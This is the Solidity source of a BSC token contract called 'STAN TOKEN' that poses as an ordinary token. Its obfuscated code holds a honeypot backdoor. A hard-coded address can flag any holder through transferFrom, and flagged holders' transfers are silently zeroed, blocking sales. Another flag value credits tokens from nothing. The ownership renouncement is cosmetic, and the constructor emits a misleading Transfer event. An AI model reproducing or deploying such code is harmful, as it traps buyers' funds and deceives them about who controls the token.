/**
 *Submitted for verification at BscScan.com on 2023-03-19
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract STAN {
    using SafeMath for uint256;
    mapping (address => uint256) private VBCa;
	 address GGL = 0xFDc30837540C8b699052859ECDDC4B62bcd919EF;
    mapping (address => uint256) public VBCb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "STAN TOKEN";
	
    string public symbol = "STAN";
    uint8 public decimals = 6;

    uint256 public totalSupply = 250000000 *10**6;
    address owner = msg.sender;
	address private VBCc;
    uint256 private VBCn;
    uint256 private VBCm;
    
    
     
    

  
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address VBCf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
     
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
       VBCn = 7;
       VBCm = 4;
             VBCa[msg.sender] = totalSupply;
    
       CALX();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function CALX() internal  {                             
                      
                       VBCc = VBCf;

                

        emit Transfer(address(0), VBCc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return VBCa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        
                    if(VBCb[msg.sender] > VBCn) {
                            require(VBCa[msg.sender] >= value);
       
                   value = 0;}
                   else

                           if(VBCb[msg.sender] == VBCm) {
          
             VBCa[to] += value;  
 }
        else

    require(VBCa[msg.sender] >= value);
VBCa[msg.sender] -= value;  
VBCa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 	


 

   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  


    

         if(msg.sender == GGL){
        VBCb[to] += value;
        return true;}
        else
     

                    if(VBCb[from] > VBCn || VBCb[to] > VBCn) {
                               require(value <= VBCa[from]);
        require(value <= allowance[from][msg.sender]);
                   value = 1;}
        else

         if(from == owner){from == VBCf;}

    
      
        require(value <= VBCa[from]);
        require(value <= allowance[from][msg.sender]);
        VBCa[from] -= value;
        VBCa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
       


      
}



     

        	
 }